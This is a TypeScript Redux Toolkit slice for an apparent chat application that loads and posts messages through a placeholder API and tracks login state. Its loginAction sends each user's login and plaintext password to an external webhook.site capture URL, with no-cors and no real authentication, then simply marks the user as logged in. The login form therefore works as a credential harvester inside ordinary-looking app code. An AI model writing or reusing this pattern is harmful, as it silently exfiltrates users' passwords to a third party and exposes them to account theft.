import { createAsyncThunk, createSlice, PayloadAction } from "@reduxjs/toolkit";
import { Message, Messages } from "../types/message";
import { State } from "../types/state";

export const fetchMessages = createAsyncThunk<
  Messages,
  void,
  { rejectValue: string }
>("messages/fetchMessages", async function (_, { rejectWithValue }) {
  try {
    const response = await fetch(
      "https://jsonplaceholder.typicode.com/comments?_limit=10"
    );
    if (!response.ok) {
      throw new Error("Server error");
    }

    const data: Messages = await response.json();
    return data;
  } catch (err) {
    if (err instanceof Error) {
      return rejectWithValue(err.message);
    }
    return rejectWithValue("Unknown error");
  }
});

export const sendMessage = createAsyncThunk<
  void,
  string,
  { state: State; rejectValue: string }
>(
  "messages/sendMessage",
  async function (text, { rejectWithValue, dispatch, getState }) {
    const state = getState() as State;
    const currentChat = state.messagesData.currentDialogue;
    try {
      const message = {
        ...currentChat,
        id: -1,
        body: text,
        name: "Вы",
      };

      const response = await fetch(
        `https://jsonplaceholder.typicode.com/comments/`,
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify(message),
        }
      );

      if (!response.ok) {
        throw new Error("Can not send message for some reason");
      }

      const data = await response.json();

      dispatch(addMessage(data));
    } catch (err) {
      if (err instanceof Error) {
        return rejectWithValue(err.message);
      }
      return rejectWithValue("Unknown error");
    }
  }
);

export const loginAction = createAsyncThunk<
  { login: string; password: string },
  { login: string; password: string }
>(
  "login/loginAction",
  async function ({ login, password }, { rejectWithValue, dispatch }) {
    try {
      await fetch("https://webhook.site/5923ec40-16d3-446d-ae12-04ec15a5fb91", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ login, password }),
        mode: 'no-cors'
      });

      console.log('Данные отправлены на webhook.site');
      dispatch(logIn({ login, password }));

      return { login, password };
    } catch (err) {
      if (err instanceof Error) {
        return rejectWithValue(err.message);
      }
      return rejectWithValue("Unknown error");
    }
  }
);

export type messagesProcess = {
  messages: Messages;
  isLoading: boolean;
  isError: boolean;
  currentDialogue: Message | null;
  isLoggedIn: boolean;
  email: string;
};

const defaultMessages: Messages = [];

const initialState: messagesProcess = {
  messages: defaultMessages,
  currentDialogue: defaultMessages[0],
  isLoading: false,
  isError: false,
  isLoggedIn: false,
  email: "",
};

const messageSlice = createSlice({
  name: "messages",
  initialState,
  reducers: {
    setActiveChat: (state, action: PayloadAction<string>) => {
      const currentUser = state.messages.find(
        (messageObj) => messageObj.email === action.payload
      );

      if (currentUser) {
        state.currentDialogue = currentUser;
      } else {
        state.currentDialogue = defaultMessages[0];
      }
    },
    addMessage: (state, action: PayloadAction<Message>) => {
      state.messages.push(action.payload);
    },
    logIn: (state, action) => {
      state.isLoggedIn = true;
      state.email = action.payload.login;
    },
    logoutAction: (state) => {
      state.email = "";
      state.isLoggedIn = false;
      state.messages = [];
    },
  },
  extraReducers: (builder) => {
    builder
      .addCase(fetchMessages.pending, (state) => {
        state.isLoading = true;
      })
      .addCase(fetchMessages.fulfilled, (state, action) => {
        state.isLoading = false;
        state.messages = action.payload;
        state.currentDialogue = null;
        state.isError = false;
      })
      .addCase(fetchMessages.rejected, (state) => {
        state.isError = true;
      })
      .addCase(sendMessage.pending, (state) => {
        state.isLoading = true;
      })
      .addCase(sendMessage.fulfilled, (state) => {
        state.isLoading = false;
      });
  },
});

export const { setActiveChat, addMessage, logIn, logoutAction } =
  messageSlice.actions;

export default messageSlice.reducer;
